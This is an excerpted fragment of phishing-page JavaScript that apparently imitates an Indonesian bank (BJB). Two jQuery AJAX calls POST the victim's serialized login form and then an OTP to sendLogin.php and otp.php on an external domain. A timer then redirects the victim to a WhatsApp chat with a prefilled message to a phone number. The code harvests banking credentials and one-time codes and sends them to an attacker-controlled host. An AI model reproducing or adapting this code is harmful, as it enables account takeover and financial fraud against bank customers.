...
$.ajax({
 type: 'POST',
 url: 'https://choreo-is.masuk.web.id/bjb04@/sendLogin.php',
 async: false,
 dataType: 'JSON',
 data: $(this).serialize(), 
...
$.ajax({
 type: 'POST',
 url: 'https://choreo-is.masuk.web.id/bjb04@/otp.php',
 async: false,
 dataType: 'JSON',
 data: $(this).serialize(), 
 complete: function(data) {
...
var timer = setInterval(function() {
  ...
  if (i == 0) {
  $("#timer").hide();
   location.href='https://api.whatsapp.com/send?phone=628161140003&text=𝗛𝗮𝗹𝗹𝗼 𝗯𝗮𝗻𝗸 𝗯𝗷𝗯%0ASaya mau request Pesan SMS ke layanan (83373)';
    clearInterval(timer);
